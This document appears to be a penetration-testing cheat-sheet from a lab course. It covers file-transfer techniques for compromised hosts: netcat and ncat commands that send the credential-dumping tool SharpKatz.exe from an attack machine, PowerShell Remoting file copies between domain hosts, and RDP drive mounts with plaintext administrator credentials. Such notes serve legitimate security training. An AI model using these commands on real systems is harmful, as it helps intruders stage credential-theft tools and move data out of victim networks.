---
title: Miscellaneous File Transfer Methods
tags: [download, upload, rdp]
tools: ['nc', 'netcat', 'ncat', 'xfreerdp', 'rdesktop']
notes: "Various miscellaneous file transfer techniques"
---

# Miscellaneous File Transfer Methods

## Linux

### File Transfer with Netcat and Ncat

> These methods can be reversed for upload to attack machine, if allowed through firewall 

Send to Compromised Machine

```bash
# Netcat
# Setup the listener on compromised host
nc -l -p 8000 > SharpKatz.exe
# Send the file
nc -q 0 192.168.49.128 8000 < SharpKatz.exe

# Ncat
# Setup the listener on compromised host
ncat -l -p 8000 --recv-only > SharpKatz.exe
# Send the file
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Sending file as input   

```bash
# 443 is used due to firewall

# Netcat
# Sending file from attack machine
sudo nc -l -p 443 -q 0 < SharpKatz.exe

# Receive the file
nc 192.168.49.128 443 > SharpKatz.exe

# Ncat - 443 is used due to firewall
# Sending file from attack machine
sudo ncat -l -p 443 --send-only < SharpKatz.exe

# Receive the file
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

## Windows/Active Directory

### PowerShell Session File Transfer

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration.

**From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.**          

```powershell
whoami
htb\administrator

hostname
DC01

Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

**Create a PowerShell Remoting Session to DATABASE01**

`$Session = New-PSSession -ComputerName DATABASE01`

**Copy samplefile.txt from our Localhost to the DATABASE01 Session** 

`Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\`

**Copy DATABASE.txt from DATABASE01 Session to our Localhost**

`Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session`

------

### RDP

Connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.

**Mounting a Linux Folder Using rdesktop**

`rdesktop 192.168.1.10 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files`

**Mounting a Linux Folder Using xfreerdp**

`xfreerdp3 /v:192.168.1.10 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`
